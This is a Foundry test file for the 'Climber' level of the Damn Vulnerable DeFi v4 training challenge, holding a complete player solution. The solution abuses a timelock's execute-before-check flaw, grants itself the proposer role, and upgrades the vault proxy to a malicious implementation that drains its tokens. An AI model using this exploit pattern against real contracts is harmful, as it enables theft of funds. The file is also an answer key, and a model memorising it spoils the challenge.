// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
   }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        ScheduleHelper helper = new ScheduleHelper();
        MaliciousImplm newImplementation = new MaliciousImplm();
        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(helper);
        targets[3] = address(vault);
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        bytes32 salt = keccak256("salt");
        bytes[] memory dataElement = new bytes[](4);
        bytes32 PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
        dataElement[0] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, helper);
        dataElement[1] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        dataElement[2] = abi.encodeWithSelector(ScheduleHelper.scheduleFromStorage.selector);
        bytes memory dataToImplementation = abi.encodeWithSelector(MaliciousImplm.transfer.selector, token, recovery);
        dataElement[3] = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, newImplementation, dataToImplementation);
        helper.setup(timelock, targets, values, dataElement, salt);
        timelock.execute(targets, values, dataElement, salt);   
        MaliciousImplm(address(vault)).transfer(token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
contract MaliciousImplm is ClimberVault {
    function transfer(DamnValuableToken _token, address _receiver) public {
        _token.transfer(_receiver, _token.balanceOf(address(this)));
    }
}
contract ScheduleHelper {
    ClimberTimelock public timelock;
    address[] public storedTargets;
    uint256[] public storedValues;
    bytes[] public storedDataElements;
    bytes32 public storedSalt;

    function setup(
        ClimberTimelock _timelock,
        address[] calldata _targets,
        uint256[] calldata _values,
        bytes[] calldata _dataElements,
        bytes32 _salt
    ) external {
        timelock = _timelock;
        delete storedTargets;
        delete storedValues;
        delete storedDataElements;
        for (uint256 i = 0; i < _targets.length; i++) {
            storedTargets.push(_targets[i]);
            storedValues.push(_values[i]);
            storedDataElements.push(_dataElements[i]);
        }
        storedSalt = _salt;
    }

    function scheduleFromStorage() external {
        address[] memory t = storedTargets;
        uint256[] memory v = storedValues;
        bytes[] memory d = storedDataElements;
        timelock.schedule(t, v, d, storedSalt);
    }
}